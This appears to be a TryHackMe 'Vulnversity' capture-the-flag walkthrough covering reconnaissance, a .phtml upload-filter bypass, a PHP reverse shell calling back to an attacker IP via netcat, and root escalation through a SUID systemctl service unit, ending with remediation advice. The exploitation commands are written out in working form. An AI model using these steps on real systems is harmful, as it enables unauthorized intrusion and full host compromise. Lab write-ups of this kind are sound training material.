# 🏛️ TryHackMe: Vulnversity Walkthrough
[![Category: CTF Writeup](https://img.shields.io/badge/Category-CTF%20Writeup-blue.svg)](#)
[![Platform: TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-red.svg)](https://tryhackme.com)
[![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-green.svg)](#)

Welcome to my deep-dive architectural walkthrough of the **Vulnversity** machine on TryHackMe. This repository serves as a highly detailed documentation of a standard network and web application penetration test—moving from black-box network reconnaissance to remote code execution (RCE) and local privilege escalation.

---

## 🏗️ Attack Lifecycle Architecture

[Phase 1: Recon]     ──>  [Phase 2: Enum]         ──>  [Phase 3: Exploitation]   ──>  [Phase 4: PrivEsc]
Nmap Scan                 Gobuster Directory           Extension Fuzzing (Burp)       SUID Discovery
(Identify Ports/OS)       Bruteforcing (/internal/)    Payload Upload (.phtml)        systemctl Abuse

---

## 🔍 Phase 1: Advanced Network Reconnaissance

The initial vector begins with aggressive network layer enumeration to discover all exposed attack surfaces on the target host system.

### Executing the Network Scan
```bash
nmap -sC -sV -A -O -p- -T4 --min-rate 1000 -v -oN nmap_deep_scan.txt <TARGET_IP>

```

#### Flag Breakdown:

* `-sC`: Performs a script scan using the default set of Nmap Scripting Engine (NSE) scripts.
* `-sV`: Probes open ports to determine service/version information.
* `-A`: Enables OS detection, version detection, script scanning, and traceroute.
* `-p-`: Scans all 65,535 TCP ports to ensure no non-standard services are hidden.
* `-T4`: Sets the timing template to aggressive for faster execution without destabilizing the network.
* `-oN`: Saves the output in normal text format for easy documentation parsing.

*Figure 1: Full Nmap terminal console output displaying open ports, service versions, and system fingerprints.*

### Attack Surface Analysis Table

| Port | Protocol | Service | Version Detected | Exploitability Assessment |
| --- | --- | --- | --- | --- |
| **21** | TCP | FTP | vsftpd 3.0.3 | Check for anonymous login vulnerabilities. |
| **22** | TCP | SSH | OpenSSH 7.2p2 | Potential brute-force or credential access surface. |
| **139/445** | TCP | NetBIOS/SMB | Samba 4.3.11-Ubuntu | Enumerate shared folders/null sessions. |
| **3128** | TCP | Squid Proxy | Squid http proxy 3.5.12 | Potential internal network routing pivot point. |
| **3333** | TCP | HTTP | Apache httpd 2.4.18 | Primary high-value target vector (Web Application). |

---

## 📁 Phase 2: Web Directory Enumeration

Because an Apache HTTP daemon is running on a non-standard port (`3333`), we must profile the web ecosystem for hidden configuration files, administration subdirectories, or unauthenticated forms.

### Directory Bruteforcing

```bash
gobuster dir -u http://<TARGET_IP>:3333/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,log

```

#### Flag Breakdown:

* `dir`: Instructs Gobuster to use directory/file brute-forcing mode.
* `-w`: Points to the specific wordlist (`directory-list-2.3-medium.txt`).
* `-t 50`: Spawns 50 concurrent threads to accelerate directory discovery.
* `-x`: Appends specific extensions to the wordlist inputs to discover raw scripts.

*Figure 2: Gobuster terminal output confirming the extraction of a hidden web portal.*

### Extracted Application Endpoints:

* `/internal/` (Status: 301) $\rightarrow$ Leads to a hidden application sub-routing framework.
* `/internal/index.php` (Status: 200) $\rightarrow$ Renders an **unauthenticated file upload interface**.

---

## ⚡ Phase 3: Web Server Compromise (Arbitrary File Upload Bypass)

The `/internal/index.php` portal exposes a document submission mechanic. Uploading a regular PHP script (`shell.php`) triggers a native application logic block error saying *"Extension not allowed"*. This confirms a **Blacklist-based input filtering mechanism** is active.

### Automation via Burp Suite Intruder

To map the blacklist parameters, we systematically pass several web extensions through a localized fuzzing attack.

1. Capture the form upload post request inside **Burp Suite Proxy**.
2. Pass the raw payload state directly into the **Intruder Module**.
3. Set the position payload anchor directly around the file extension: `shell.§ext§`
4. Load the extension test payload vectors: `.php`, `.php3`, `.php4`, `.php5`, `.phtml`.

*Figure 3: Burp Suite Intruder runtime graph highlighting variations in HTTP response lengths.*

### Fuzzing Matrix Evaluation

* `.php` $\rightarrow$ `HTTP 200` (Response Body: Blocked/Invalid)
* `.php5` $\rightarrow$ `HTTP 200` (Response Body: Blocked/Invalid)
* **`.phtml`** $\rightarrow$ **`HTTP 200 (Length Variation / Upload Successful Alert)`**

The backend interpreter executes `.phtml` documents as valid PHP code, but the validation logic forgot to block this specific alternative extension in its validation array.

---

## 🐚 Phase 4: Weaponization & Reverse Shell Foothold

Using the identified logic flaw, we generate a weaponized PHP payload designed to force the target's operating system to connect back to our listener infrastructure.

### Configuring the Monitored Hook

Open your local deployment console terminal and execute a native Netcat pipeline wrapper listener:

```bash
nc -lvnp 4444

```

### Modifying the Reverse Shell Script

Acquire a copy of the standard Pentestmonkey PHP reverse shell. Open the asset file and overwrite the execution variables with your AttackBox IP address:

```php
\$ip = '10.48.182.43';  // Configured to your active AttackBox/VPN IP
\$port = 4444;          // Match the exact port used on your Netcat listener

```

Save this active state configuration file explicitly as **`shell.phtml`**.

### Execution Pipeline

1. Upload `shell.phtml` through the web interface at `http://<TARGET_IP>:3333/internal/index.php`.
2. Force execution by browsing straight to the absolute path where uploaded files are saved:
```bash
curl http://<TARGET_IP>:3333/internal/uploads/shell.phtml

```



*Figure 4: Netcat listener console capturing the incoming low-privileged user connection pipeline.*

### Stabilizing the Interactive TTY Terminal

Once the connection drops into your listener, spawn a fully stable system terminal using Python:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z to background the shell
stty raw -echo; fg

```

Now, navigate to the local target system folder to capture the first flag:

```bash
cat /home/bill/user.txt

```

---

## 👑 Phase 5: Local Privilege Escalation (Abusing SUID systemctl)

We are currently operating as the low-privilege system account user `www-data`. To fully capture the root flag, we must escalate our privileges to superuser (`root`).

### Auditing for Misconfigured SUID Binaries

Run a system-wide search query to locate binaries configured with the Set-UID (SUID) privilege bit.

```bash
find / -perm -u=s -type f 2>/dev/null

```

*Figure 5: Active terminal stream detailing found system SUID programs, focusing on systemctl.*

### Critical Vulnerability Discovery

The scan discovers that **`/bin/systemctl`** has its SUID bit enabled. `systemctl` manages system services. Because it runs with root privileges here, we can create a custom system service that runs commands as root.

### Building the SUID Exploit Payload

We can execute an exploitation pattern based on the GTFOBins framework. Run this script in your interactive shell session:

```bash
# 1. Define a temporary configuration variable mapping for a unique service module
TF=\$(mktemp).service

# 2. Inject structural system execution directives into the variable configuration layout
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/root_flag.txt"
[Install]
WantedBy=multi-user.target' > \$TF

# 3. Use systemctl to register and immediately run our malicious service unit
/bin/systemctl link \$TF
/bin/systemctl enable --now \$TF

```

### Extracting the Final Flag

The service script automatically dumps the contents of the protected root folder straight into the world-readable `/tmp/` directory.

```bash
cat /tmp/root_flag.txt

```

*Figure 6: Final console screenshot displaying the successful display of the root flag.*

---

## 🛡️ Remediation Blueprint

1. **Secure File Upload Validation:** Replace the porous extension blacklist validation structure with a strict **Whitelist Verification Policy**. Only permit highly specific extensions (like `.jpg`, `.png`, `.pdf`) and check the file's magic bytes (MIME-type validation) rather than relying just on the file extension name.
2. **Hardening SUID Binaries:** Remove the SUID bit from structural system utilities like `systemctl` unless absolutely necessary for business logic operations. To remove the vulnerable SUID bit configuration discovered on this box, run:
```bash
chmod u-s /bin/systemctl

```
